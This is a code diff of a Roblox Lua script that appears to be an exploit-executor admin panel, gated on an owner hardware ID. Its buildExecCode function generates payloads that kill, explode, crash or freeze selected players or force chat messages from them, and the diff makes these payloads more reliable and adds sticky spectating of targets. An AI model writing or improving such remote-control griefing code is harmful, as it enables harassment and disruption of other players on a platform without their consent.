@@ -1,3 +1,4 @@
+--123132
 local isOwnerHwid = ...
 if not isOwnerHwid then return end
 
@@ -148,14 +149,18 @@ local function aToggleButton(parent, text, size, callback)
 
     local state = false
     btn.MouseButton1Click:Connect(function()
-        state = not state
+        local newState = not state
+        if callback then
+            local result = callback(newState)
+            if result == false then return end
+        end
+        state = newState
         TweenService:Create(track, TweenInfo.new(0.2), {
             BackgroundColor3 = state and ADMIN_GREEN or Color3.fromRGB(30, 22, 28),
         }):Play()
         TweenService:Create(knob, TweenInfo.new(0.2), {
             Position = state and UDim2.new(1, -15, 0.5, -6) or UDim2.new(0, 3, 0.5, -6),
         }):Play()
-        if callback then callback(state) end
     end)
 
     btn.MouseEnter:Connect(function()
@@ -397,7 +402,10 @@ local function buildExecCode(cmdType, payload)
 local plr = game:GetService("Players").LocalPlayer
 if plr and plr.Character then
     local hum = plr.Character:FindFirstChildOfClass("Humanoid")
-    if hum then hum.Health = 0 end
+    if hum then
+        hum.Health = 0
+        pcall(function() hum:TakeDamage(hum.MaxHealth) end)
+    end
 end
 ]]
     elseif cmdType == "explode" then
@@ -405,6 +413,7 @@ end
 local plr = game:GetService("Players").LocalPlayer
 if plr and plr.Character then
     local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
+    local hum = plr.Character:FindFirstChildOfClass("Humanoid")
     if hrp then
         local e = Instance.new("Explosion")
         e.Position = hrp.Position
@@ -413,6 +422,7 @@ if plr and plr.Character then
         e.DestroyJointRadiusPercent = 0
         e.Parent = workspace
     end
+    if hum then hum.Health = 0 end
 end
 ]]
     elseif cmdType == "crash" then
@@ -425,50 +435,86 @@ local sg = Instance.new("ScreenGui")
 sg.Name = "AdminCenterText"
 sg.IgnoreGuiInset = true
 sg.ResetOnSpawn = false
-local okp = pcall(function()
-    if typeof(gethui) == "function" then
-        sg.Parent = gethui()
-    else
-        sg.Parent = game:GetService("CoreGui")
-    end
-end)
-if not okp or not sg.Parent then
-    sg.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+sg.DisplayOrder = 999999
+local ok = false
+if typeof(gethui) == "function" then
+    ok = pcall(function() sg.Parent = gethui() end)
 end
-local lbl = Instance.new("TextLabel")
-lbl.AnchorPoint = Vector2.new(0.5, 0.5)
-lbl.Position = UDim2.new(0.5, 0, 0.5, 0)
-lbl.Size = UDim2.new(0.92, 0, 0, 110)
-lbl.BackgroundTransparency = 1
-lbl.Text = text
-lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
-lbl.Font = Enum.Font.GothamBold
-lbl.TextScaled = true
-lbl.TextWrapped = true
-lbl.TextStrokeTransparency = 0
-lbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-lbl.Parent = sg
-task.delay(8, function()
+if not ok then
+    ok = pcall(function() sg.Parent = game:GetService("CoreGui") end)
+end
+if not ok then
+    ok = pcall(function()
+        sg.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui", 2)
+    end)
+end
+if sg.Parent then
+    local lbl = Instance.new("TextLabel")
+    lbl.AnchorPoint = Vector2.new(0.5, 0.5)
+    lbl.Position = UDim2.new(0.5, 0, 0.5, 0)
+    lbl.Size = UDim2.new(0.92, 0, 0, 110)
+    lbl.BackgroundTransparency = 1
+    lbl.Text = text
+    lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
+    lbl.Font = Enum.Font.GothamBold
+    lbl.TextScaled = true
+    lbl.TextWrapped = true
+    lbl.TextStrokeTransparency = 0
+    lbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    lbl.Parent = sg
+end
+task.delay(2, function()
     pcall(function() if sg then sg:Destroy() end end)
 end)
 ]]):format(text)
     elseif cmdType == "chat_text" then
         local text = escapeLuaSingle(payload.text or "")
         return ([[
+local text = '%s'
+local sent = false
 pcall(function()
     local TCS = game:GetService("TextChatService")
-    if TCS and TCS.TextChannels and TCS.TextChannels.RBXGeneral then
-        TCS.TextChannels.RBXGeneral:SendAsync('%s')
+    if TCS and TCS.TextChannels then
+        local ch = TCS.TextChannels:FindFirstChild("RBXGeneral")
+        if ch then ch:SendAsync(text); sent = true end
     end
 end)
+if not sent then
+    pcall(function()
+        local ev = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
+        if ev then
+            local say = ev:FindFirstChild("SayMessageRequest")
+            if say then say:FireServer(text, "All"); sent = true end
+        end
+    end)
+end
+if not sent then
+    pcall(function()
+        game:GetService("StarterGui"):SetCore("ChatSendMessage", { Text = text })
+    end)
+end
 ]]):format(text)
     elseif cmdType == "freeze" then
         local state = payload.state and "true" or "false"
         return ([[
 local plr = game:GetService("Players").LocalPlayer
-if plr and plr.Character then
-    local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
-    if hrp then hrp.Anchored = %s end
+if not plr then return end
+local char = plr.Character
+if not char then return end
+local hrp = char:FindFirstChild("HumanoidRootPart")
+local hum = char:FindFirstChildOfClass("Humanoid")
+local frozen = %s
+if hrp then
+    for _, v in ipairs(hrp:GetChildren()) do
+        if v.Name == "__AdminFreezePart" then v:Destroy() end
+    end
+    hrp.Anchored = frozen
+end
+if hum then
+    hum.PlatformStand = frozen
+    if not frozen then
+        pcall(function() hum:ChangeState(Enum.HumanoidStateType.GettingUp) end)
+    end
 end
 ]]):format(state)
     elseif cmdType == "invis" then
@@ -935,6 +981,7 @@ end
 local panelRef = { sg = nil, main = nil, scale = nil }
 local dragConn = nil
 local endConn = nil
+local specConn = nil
 
 local function closeAllDropdowns()
     local snapshot = {}
@@ -1245,21 +1292,29 @@ function buildAdminPanel()
     local spectateToggle = aToggleButton(rightCol, "Spectate", UDim2.new(1, 0, 0, 30), function(state)
         if state then
             local targetUid = getFirstSelectedUserId()
-            if not targetUid then return end
+            if not targetUid then return false end
             local target = Players:GetPlayerByUserId(targetUid)
-            if target and target.Character then
-                local hum = target.Character:FindFirstChildOfClass("Humanoid")
-                if hum then
-                    workspace.CurrentCamera.CameraSubject = hum
+            if not target then return false end
+            local hum = target.Character and target.Character:FindFirstChildOfClass("Humanoid")
+            if not hum then return false end
+            workspace.CurrentCamera.CameraSubject = hum
+
+            if specConn then specConn:Disconnect() end
+            specConn = target.CharacterAdded:Connect(function()
+                task.wait(0.2)
+                if target.Character then
+                    local h = target.Character:FindFirstChildOfClass("Humanoid")
+                    if h then workspace.CurrentCamera.CameraSubject = h end
                 end
-            end
+            end)
+            return true
         else
+            if specConn then specConn:Disconnect(); specConn = nil end
             if player.Character then
                 local myHum = player.Character:FindFirstChildOfClass("Humanoid")
-                if myHum then
-                    workspace.CurrentCamera.CameraSubject = myHum
-                end
+                if myHum then workspace.CurrentCamera.CameraSubject = myHum end
             end
+            return true
         end
     end)
     spectateToggle.Position = UDim2.new(0, 0, 0, 102)
